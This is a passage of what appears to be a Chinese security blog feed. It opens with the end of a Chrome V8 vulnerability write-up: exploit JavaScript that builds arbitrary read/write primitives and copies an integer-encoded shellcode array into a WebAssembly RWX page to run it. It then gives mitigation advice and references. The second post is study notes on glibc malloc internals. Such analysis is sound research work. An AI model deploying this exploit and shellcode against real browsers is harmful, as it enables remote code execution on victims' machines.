class="line">&#125;</span><br><span class="line"><span class="comment">//用Array的element属性伪造一个Array，构造arbread和arbwrite原语实现任意地址读写</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> buf2 = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x150</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">copy_shellcode</span>(<span class="params">addr, shellcode</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> dataview = <span class="keyword">new</span> <span class="built_in">DataView</span>(buf2);</span><br><span class="line">    <span class="keyword">let</span> buf_addr = addrof(buf2);</span><br><span class="line">    <span class="keyword">let</span> backing_store_addr = buf_addr + <span class="number">0x14n</span>;</span><br><span class="line">    arbwrite(backing_store_addr, addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; shellcode.length; i++) &#123;</span><br><span class="line">        dataview.setUint32(<span class="number">4</span>*i, shellcode[i], <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> rwx_page_addr = ftoi(arbread(addrof(wasm_instance) + <span class="number">0x68n</span>));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[+] Address of rwx page: &quot;</span> + rwx_page_addr.toString(<span class="number">16</span>));</span><br><span class="line"><span class="keyword">var</span> shellcode = [<span class="number">3833809148</span>,<span class="number">12642544</span>,<span class="number">1363214336</span>,<span class="number">1364348993</span>,<span class="number">3526445142</span>,<span class="number">1384859749</span>,<span class="number">1384859744</span>,<span class="number">1384859672</span>,<span class="number">1921730592</span>,<span class="number">3071232080</span>,<span class="number">827148874</span>,<span class="number">3224455369</span>,<span class="number">2086747308</span>,<span class="number">1092627458</span>,<span class="number">1091422657</span>,<span class="number">3991060737</span>,<span class="number">1213284690</span>,<span class="number">2334151307</span>,<span class="number">21511234</span>,<span class="number">2290125776</span>,<span class="number">1207959552</span>,<span class="number">1735704709</span>,<span class="number">1355809096</span>,<span class="number">1142442123</span>,<span class="number">1226850443</span>,<span class="number">1457770497</span>,<span class="number">1103757128</span>,<span class="number">1216885899</span>,<span class="number">827184641</span>,<span class="number">3224455369</span>,<span class="number">3384885676</span>,<span class="number">3238084877</span>,<span class="number">4051034168</span>,<span class="number">608961356</span>,<span class="number">3510191368</span>,<span class="number">1146673269</span>,<span class="number">1227112587</span>,<span class="number">1097256961</span>,<span class="number">1145572491</span>,<span class="number">1226588299</span>,<span class="number">2336346113</span>,<span class="number">21530628</span>,<span class="number">1096303056</span>,<span class="number">1515806296</span>,<span class="number">1497454657</span>,<span class="number">2202556993</span>,<span class="number">1379999980</span>,<span class="number">1096343807</span>,<span class="number">2336774745</span>,<span class="number">4283951378</span>,<span class="number">1214119935</span>,<span class="number">442</span>,<span class="number">0</span>,<span class="number">2374846464</span>,<span class="number">257</span>,<span class="number">2335291969</span>,<span class="number">3590293359</span>,<span class="number">2729832635</span>,<span class="number">2797224278</span>,<span class="number">4288527765</span>,<span class="number">3296938197</span>,<span class="number">2080783400</span>,<span class="number">3774578698</span>,<span class="number">1203438965</span>,<span class="number">1785688595</span>,<span class="number">2302761216</span>,<span class="number">1674969050</span>,<span class="number">778267745</span>,<span class="number">6649957</span>];</span><br><span class="line">copy_shellcode(rwx_page_addr, shellcode);</span><br><span class="line"><span class="comment">//用构造的读写原语控制ArrayBuffer的backing_store字段和wasm的机器码内存，将shellcode写入</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f();</span><br><span class="line"><span class="comment">//执行wasm</span></span><br></pre></td></tr></table></figure>

<h2 id="四、缓解措施"><a href="#四、缓解措施" class="headerlink" title="四、缓解措施"></a>四、缓解措施</h2><p>更新新版Chrome</p>
<h2 id="五、参考文献"><a href="#五、参考文献" class="headerlink" title="五、参考文献"></a>五、参考文献</h2><p><a href="https://eternalsakura13.com/2018/05/06/v8/">https://eternalsakura13.com/2018/05/06/v8/</a><br><a href="https://ruan777.github.io/2021/04/21/Chrome_issue_1196683_1195777/">https://ruan777.github.io/2021/04/21/Chrome_issue_1196683_1195777/</a><br><a href="https://paper.seebug.org/1556/">https://paper.seebug.org/1556/</a><br><a href="https://www.venustech.com.cn/new_type/aqldfx/20210416/22627.html">https://www.venustech.com.cn/new_type/aqldfx/20210416/22627.html</a><br><a href="https://kiprey.github.io/2021/01/v8-turboFan/#%E5%9B%9B%E3%80%81turboFan%E7%9A%84%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B">https://kiprey.github.io/2021/01/v8-turboFan/#%E5%9B%9B%E3%80%81turboFan%E7%9A%84%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B</a><br><a href="https://segmentfault.com/a/1190000039908658">https://segmentfault.com/a/1190000039908658</a><br><a href="https://www.4hou.com/posts/21Y1">https://www.4hou.com/posts/21Y1</a><br><a href="https://www.freebuf.com/vuls/203721.html">https://www.freebuf.com/vuls/203721.html</a></p>
]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>漏洞分析</tag>
        <tag>Chrome</tag>
      </tags>
  </entry>
  <entry>
    <title>malloc笔记</title>
    <url>/2021/05/11/malloc/</url>
    <content><![CDATA[<p><a href="https://www.anquanke.com/post/id/172886#h3-4">学习时的参考文章</a></p>
<p><a href="https://ftp.gnu.org/gnu/glibc/">glibc源码</a></p>
<p>以前刚学堆的时候记的笔记，但是以前学的时候不知其所以然，也不会调试分析，近期重新看以前的笔记感觉明了了许多</p>
<h1 id="main-arena-and-non-main-arena"><a href="#main-arena-and-non-main-arena" class="headerlink" title="main_arena and non_main_arena"></a>main_arena and non_main_arena</h1><p>又称为主分配区和非主分配区，main_arena 是一个结构体</p>
<p>glibc2.27源码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Serialize access.  */</span></span><br><span class="line">  __libc_lock_define (, mutex);</span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">  <span class="keyword">int</span> flags;</span><br><span class="line">  <span class="comment">/* Set if the fastbin chunks contain recently inserted free blocks.  */</span></span><br><span class="line">  <span class="comment">/* Note this is a bool but not all targets support atomics on booleans.  */</span></span><br><span class="line">  <span class="keyword">int</span> have_fastchunks;<span class="comment">//glibc2.27以下没有</span></span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">  mchunkptr top;</span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[BINMAPSIZE];</span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">     by free_list_lock in arena.c.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line">  <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">     the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">     free_list_lock in arena.c.  */</span></span><br><span class="line">  INTERNAL_SIZE_T attached_threads;</span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>结构体对每一个成员给出了解释，第一个成员是 linux 下的锁，Doug Lea 实现的内存分配器只有一个主分配区，为了兼容多线程，每次分配内存之前都要对主分配区加锁，防止多线程对内存分配造成影响，这样就导致多线程锁的激烈竞争，降低了内存分配效率，而 ptmalloc 支持多线程，增加了 non_main_arena (非主分配区)，所谓 non_main_arena 其结构和主分配区相同，很多分配区通过环形链表相互串联，这样，多个线程就无需争夺同一个分配区了。但是分配区的数量毕竟是有限的，在极端情况下多个线程还是会竞争同一个分配区，所以锁依旧有用，先加锁的进程可以优先使用分配区，如果全部分配区都被加锁，那么后面的进程就会进入阻塞状态。对于 32 位系统来说，arena 最多为核心数量的 2 倍，64 位系统下 arena 最多为核心数量的 8 倍。<br>第二个成员是标志位，第三个成员用来标识最近是否有新的内存块被插入 fastbin 链表(glibc2.27中新加入)。<br>第四个成员是 fastbin 链表，第五个成员是 top chunk 的地址，在堆利用中可能会用到。第六个成员标识最后一次拆分 top chunk 得到的剩余部分，第七个成员是 smallbin、largebin 和 unsortedbin 的集合体，一共有 126 个表项。</p>
<blockquote>
<p>补：为什么有 126 个表项？这是由于 bin[0] 和 bin[127] 没有被使用，并且 bin[1] 是整个 bin 的头部。 注意 bin 定义的数量为 NBINS * 2 – 2 = 254，为什么是 254？ 这是由于缓冲区链表主要有 fd 和 bk 两个指针，smallbin 62 个、largebin 63 个，加在一起是 125 个，再加上一个头结点 bin[1] 共 126 个表项，换算成 index 一共有 252 个，所以 254 个指针空间是完全足够的！</p>
</blockquote>
<p>第八个成员 binmap 可以视为一张地图，标识链表是否为空。第九个成员是 next 指针，指向下一个 arena。<br>第十个成员指向下一个为空的 arena。第十一个成员用来标识绑定在当前 arena 线程的总量。<br>最后两个成员用来跟踪当前被系统分配的内存总量。<br>这个 glibc 版本比较新的，有一些新加入的定义。</p>
<p>常用的是在64bit的glibc2.27以下的版本中<code>unsortedbins</code>链表头在<code>main_arena+0x58</code>处，之后从<code>main_arena+0x68</code>开始是<code>smallbins</code>、<code>largebins</code>，从0x20开始按照bin大小排列不同大小的bin链表头；glibc2.27中多了一个<code>have_fastchunks</code>,因为对齐，后面的结构都往后多偏移了0x8字节。每个链表头之间差0x10字节，需要注意的是链表头的<code>fd</code>和<code>bk</code>指针在<code>链表头+0x10</code>和<code>链表头+0x18</code>的位置，也就是下一个链表头中。</p>
<h1 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a>chunk</h1><p>chunk 称为堆块，是堆的重要组成部分，当用户申请内存块时，系统就会将空间以堆块的形式返回，堆块具有一定的结构，且按照大小分为 4 类，堆块的结构定义在 malloc.c 中，代码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//glibc-2.26/malloc/malloc.c</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>基本结构包含 6 个成员，首先是 mchunk_prev_size，如果当前堆块的前一个堆块是空闲的，那么此字段就是前一个堆块的 size,若前一个堆块在使用则此成员无效，且则前一个堆块可以使用这里的空间当作自己的数据区域。</p>
<p>接着是当前堆块的 size，然后有两个指针，由于各种 bin 的存在，当堆块被释放后会进入对应的缓冲区中，并且以链表的形式存在，这里的 fd 和 bk 就是链表的前向后向指针，最后两个也是指针，但是它们只会出现在 largebin chunk 中，具体会在后面提到。</p>
<p>一个堆块可能会是下面的状态</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">            |             Size of previous chunk, if unallocated (P clear)  |</span><br><span class="line">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">            |             Size of chunk, in bytes                     |A|M|P|</span><br><span class="line">      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">            |             User data starts here...                          .</span><br><span class="line">            .                                                               .</span><br><span class="line">            .             (malloc_usable_size() bytes)                      .</span><br><span class="line">            .                                                               |</span><br><span class="line">nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">            |             (size of chunk, but used for application data)    |</span><br><span class="line">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">            |             Size of next chunk, in bytes                |A|0|1|</span><br><span class="line">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure>

<p>需要注意 size 标志位的最低三位 A、M、P，由于对齐的原因，程序中size只会是0x8倍数，64位程序中是0x10的倍数，如果把 size 转换成二进制，它的最低三个 bit 始终都是 0，所以它们就有了了新的用途。<br>A(NON_MAIN_ARENA) 用来表示当前堆块是否属于 main_arena，M(IS_MAPPED)用来表示当前堆块是否由 mmap 分配，P(PREV_INUSE)是最为常用的标志位，用来表示当前堆块的前一个堆块是否空闲。</p>
<h1 id="bins"><a href="#bins" class="headerlink" title="bins"></a>bins</h1><p>为了加快内存分配效率，ptmalloc 引入了缓冲区，把较小的堆块保存在缓冲区中，这样就可以减少和操作系统申请内存的次数，提高效率。缓冲区有一定的格式，按照堆块的大小分成了 4 类即 fastbin、smallbin、largebin、unsortedbin。</p>
<h2 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h2><p>结构</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+-----------------+-----------------+</span><br><span class="line">|                 |                 |</span><br><span class="line">|     prev_size   |      size       |</span><br><span class="line">|                 |                 |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">|                 |                 |</span><br><span class="line">|        fd       |                 |</span><br><span class="line">|                 |                 |</span><br><span class="line">+-----------------+                 |</span><br><span class="line">|                                   |</span><br><span class="line">|            user data              |</span><br><span class="line">|                                   |</span><br><span class="line">+-----------------------------------+</span><br></pre></td></tr></table></figure>

<p>fastbin chunk 的大小限制在 0x10 ~ 0x40(0x20 ~ 0x80 if OS is 64 bit)，这些 chunk 通过 fd 连接成一条单向链表，在主分配区中定义了 fastbins 指针，我们可以将它展开(64bit):</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">   index         size</span><br><span class="line">fastbinY[0]      0x20</span><br><span class="line">fastbinY[1]      0x30</span><br><span class="line">fastbinY[2]      0x40</span><br><span class="line">fastbinY[3]      0x50</span><br><span class="line">fastbinY[4]      0x60</span><br><span class="line">fastbinY[5]      0x70</span><br><span class="line">fastbinY[6]      0x80</span><br><span class="line">fastbinY[7]      N&#x2F;A</span><br><span class="line">fastbinY[8]      N&#x2F;A</span><br><span class="line">fastbinY[9]      N&#x2F;A</span><br></pre></td></tr></table></figure>

<p>最后三个是保留项，暂时没有使用。</p>
<p>fastbin 顾名思义，它分配堆块的速度很快，且仅仅保存很小的堆块，fastbin chunk 的两个特点是没有 bk 指针并且 PREV_INUSE 标志位一定是 1，也就是说 fastbin chunk 不会和其他堆块合并(在特殊情况下还是会发生合并)。另外，fastbin 采用 LIFO 策略，从头部插入，头部取出，这样可以进一步提高分配效率。</p>
<p>附：fastbin 链表大致结构</p>
<p><img src="https://z3.ax1x.com/2021/05/11/gdMwn0.png"></p>
<h2 id="smallbin"><a href="#smallbin" class="headerlink" title="smallbin"></a>smallbin</h2><p>第二类是 smallbin，这也是很常用的链表，smallbin chunk 近似于一个标准格式的 chunk，结构如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+-----------------+-----------------+</span><br><span class="line">|                 |                 |</span><br><span class="line">|     prev_size   |      size       |</span><br><span class="line">|                 |                 |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">|                 |                 |</span><br><span class="line">|        fd       |       bk        |</span><br><span class="line">|                 |                 |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">|                                   |</span><br><span class="line">|                                   |</span><br><span class="line">|            user data              |</span><br><span class="line">|                                   |</span><br><span class="line">|                                   |</span><br><span class="line">+-----------------+-----------------+</span><br></pre></td></tr></table></figure>

<p>相比于 fastbin chunk，这里多出了 bk 指针，需要注意的是 fd 和 bk 指针(以及 fd_nextsize、bk_nextsize 指针)都是可以作为用户数据被覆盖的，它们只会在堆块空闲时发挥作用,堆块使用时这些指针的位置都是数据区。</p>
<p>smallbin 的范围在 0x10 ~ 0x1f8(0x20 ~ 0x3f0 if OS is 64 bit)，smallbin 和 fastbin 有一部分是重合的，其实 fastbin 中的堆块在一定情况下可以进入到 smallbin 中(当发生 consolidate 时)。一些 smallbin chunk 相互串联形成了一条双向链表</p>
<p>附：smallbin 链表大致结构</p>
<p><img src="https://z3.ax1x.com/2021/05/11/gdMc9J.png"></p>
<p>smallbin 采用FIFO，链表从头部插入，尾部取出。</p>
<h2 id="largebin"><a href="#largebin" class="headerlink" title="largebin"></a>largebin</h2><p>第三类是 largebin，专门用来保存一些较大的堆块，范围从 0x200(0x400 if OS is 64bit) 开始。一个 largebin chunk 结构可能如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+---------------+---------------+</span><br><span class="line">|               |               |</span><br><span class="line">|   prev_size   |    size       |</span><br><span class="line">|               |               |</span><br><span class="line">+-------------------------------+</span><br><span class="line">|               |               |</span><br><span class="line">|      fd       |      bk       |</span><br><span class="line">|               |               |</span><br><span class="line">+-------------------------------+</span><br><span class="line">|               |               |</span><br><span class="line">|   fd_nextsize |  bk_nextsize  |</span><br><span class="line">|               |               |</span><br><span class="line">+---------------+---------------+</span><br><span class="line">|                               |</span><br><span class="line">|                               |</span><br><span class="line">|            user_data          |</span><br><span class="line">|                               |</span><br><span class="line">+-------------------------------+</span><br></pre></td></tr></table></figure>

<p>largebin共63个，32bit组织方法如下：</p>
<p>32个bin 每0x40个字节一个阶层，比如第一个0x200-0x238字节，第二个0x240 – 0x278字节……</p>
<p>16个bin 每0x200字节一个阶层</p>
<p>8个bin每0x1000字节一个阶层</p>
<p>4个bin每0x8000字节一个阶层</p>
<p>2个bin每0x40000字节一个阶层</p>
<p>64bit一样的组织方式只是从0x400开始</p>
<p>最后一个bin包括所有剩下的大小。不同于其他链表，largebin 每一个表项保存的是一个范围，所以会用到 fd_nextsize 和 bk_nextsize 指针。largebin 中的chunk是按 size 排序的，<code>bin-&gt;fd</code>指向最大的 chunk，<code>bin-&gt;bk</code>指向最小的，每个 chunk 的 fd 指针指向下一个 比该 chunk 小或 size 相同的 chunk，bk 指针则相反。<code>fd_nextsize</code>指针指向下一个比该 chunk 小的 chunk，<code>bk_nextsize</code>则相反。</p>
<p>还有最大的 chunk 的<code>bk_nextsize</code>指针指向最小的 chunk，反之亦然。而最大 chunk 的 bk 指针和最小 chunk 的 fd 指针都指向 bin。</p>
<p>若 bin 中没有相同大小的 chunks，那么除了上面讲的最大最小 chunks 以外的 chunks 的 fd 指针和 <code>fd_nextsize</code>、bk 指针和 <code>bk_nextsize</code>指针完全相同。如果有相同大小的 chunks，nextsize 指针以从 bin-&gt;fd 方向出来最靠前的 chunk 为准。</p>
<h2 id="unsortedbin"><a href="#unsortedbin" class="headerlink" title="unsortedbin"></a>unsortedbin</h2><p>第四类是 unsortedbin，这个链表比较特殊，它没有针对大小进行排序，这一点从名字也能看出来，它可以被视为 smallbin 和 largebin 的缓冲区，当用户释放一个堆块之后，会先进入 unsortedbin，再次分配堆块时，ptmalloc 会优先检查这个链表中是否存在合适的堆块，如果找到了，就直接返回给用户(这个过程可能会对 unsortedbin 中的堆块进行切割)，若没有找到合适的，系统会清空这个链表，将堆块插入对应的链表中。下面引用 malloc.c 中的注释</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Unsorted chunks</span><br><span class="line">    All remainders from chunk splits, as well as all returned chunks,</span><br><span class="line">    are first placed in the &quot;unsorted&quot; bin. They are then placed</span><br><span class="line">    in regular bins after malloc gives them ONE chance to be used before</span><br><span class="line">    binning. So, basically, the unsorted_chunks list acts as a queue,</span><br><span class="line">    with chunks being placed on it in free (and malloc_consolidate),</span><br><span class="line">    and taken off (to be either used or placed in bins) in malloc.</span><br><span class="line">    The NON_MAIN_ARENA flag is never set for unsorted chunks, so it</span><br><span class="line">    does not have to be taken into account in size comparisons.</span><br></pre></td></tr></table></figure>

<h1 id="malloc-流程"><a href="#malloc-流程" class="headerlink" title="malloc 流程"></a>malloc 流程</h1><p>源码来自glibc2.23</p>
<p>malloc的外层函数是<code>__libc_malloc</code>，而实现分配的函数是在<code>__libc_malloc</code>中调用的<code>_int_malloc</code></p>
<h2 id="libc-malloc"><a href="#libc-malloc" class="headerlink" title="__libc_malloc"></a>__libc_malloc</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> *</span><br><span class="line">__libc_malloc (<span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="keyword">void</span> *victim;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *(*hook) (<span class="keyword">size_t</span>, <span class="keyword">const</span> <span class="keyword">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>)) <span class="comment">//检查hook</span></span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);  <span class="comment">//获取分配区并将其上锁 函数在arena.c中宏定义</span></span><br><span class="line"></span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);  <span class="comment">//调用_int_malloc分配chunk</span></span><br><span class="line">  <span class="comment">/* Retry with another arena only if we were able to find a usable arena</span></span><br><span class="line"><span class="comment">     before.  */</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>) <span class="comment">//分配失败就找其他分配区</span></span><br><span class="line">    &#123;</span><br><span class="line">      LIBC_PROBE (memory_malloc_retry, <span class="number">1</span>, bytes);</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes); <span class="comment">//retry函数中将之前的分配区解锁新的分配区加锁</span></span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>) <span class="comment">//分配结束 分配区解锁</span></span><br><span class="line">    (<span class="keyword">void</span>) mutex_unlock (&amp;ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">          ar_ptr == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">  <span class="keyword">return</span> victim;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="int-malloc"><a href="#int-malloc" class="headerlink" title="_int_malloc"></a>_int_malloc</h2><p>代码太长不全贴</p>
<p>先用<code>checked_request2size</code>函数把请求的size转化成真实chunk的size，因为对齐还有 chunk 头等原因，返回的 chunk 大小和用户请求的大小会不同</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">... </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">     Convert request size to internal form by adding SIZE_SZ bytes</span></span><br><span class="line"><span class="comment">     overhead plus possibly more to obtain necessary alignment and/or</span></span><br><span class="line"><span class="comment">     to obtain a size of at least MINSIZE, the smallest allocatable</span></span><br><span class="line"><span class="comment">     size. Also, checked_request2size traps (returning 0) request sizes</span></span><br><span class="line"><span class="comment">     that are so large that they wrap around zero when padded and</span></span><br><span class="line"><span class="comment">     aligned.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  checked_request2size (bytes, nb);</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>若没有可用的分配区，则调用 sysmalloc 用 mmap 或者 brk 获取一块。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="comment">/* There are no usable arenas.  Fall back to sysmalloc to get a chunk from</span></span><br><span class="line"><span class="comment">     mmap.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (av == <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">	alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>之后就判断属于哪一种 bins 的尺寸范围执行不同的代码，fastbins 优先</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">...  </span><br><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If the size qualifies as a fastbin, first check corresponding bin.</span></span><br><span class="line"><span class="comment">     This code is safe to execute even if av is not yet initialized, so we</span></span><br><span class="line"><span class="comment">     can try it without checking, which saves some time on this fast path.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (get_max_fast ()))  <span class="comment">//判断size</span></span><br><span class="line">    &#123;</span><br><span class="line">      idx = fastbin_index (nb);  <span class="comment">//获取index</span></span><br><span class="line">      mfastbinptr *fb = &amp;fastbin (av, idx);  <span class="comment">//取该index的第一给块</span></span><br><span class="line">      mchunkptr pp = *fb;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          victim = pp;</span><br><span class="line">          <span class="keyword">if</span> (victim == <span class="literal">NULL</span>)    <span class="comment">//找到NULL表示遍历结束</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim))</span><br><span class="line">             != victim); <span class="comment">//遍历找到一个合适的chunk</span></span><br><span class="line">      <span class="keyword">if</span> (victim != <span class="number">0</span>)  <span class="comment">//判断是否找到匹配chunk</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))  <span class="comment">//检查size</span></span><br><span class="line">            &#123;</span><br><span class="line">              errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">            errout:</span><br><span class="line">              malloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br><span class="line">              <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          check_remalloced_chunk (av, victim, nb);  <span class="comment">//debug用的函数，用macro宏声明，只有debug模式才有内容，在此无视就好</span></span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);  <span class="comment">//指针指向数据部分</span></span><br><span class="line">          alloc_perturb (p, bytes);  <span class="comment">//如果设置了perturb_type, 则将获取到的chunk初始化为 perturb_type ^ 0xff</span></span><br><span class="line">          <span class="keyword">return</span> p;  <span class="comment">//返回chunk</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p><code>check_remalloced_chunk</code>研究了好一会儿，网上大佬说这个函数没用但是没讲理由，我就看不懂，最后找到相关 debug 函数的宏定义：</p>
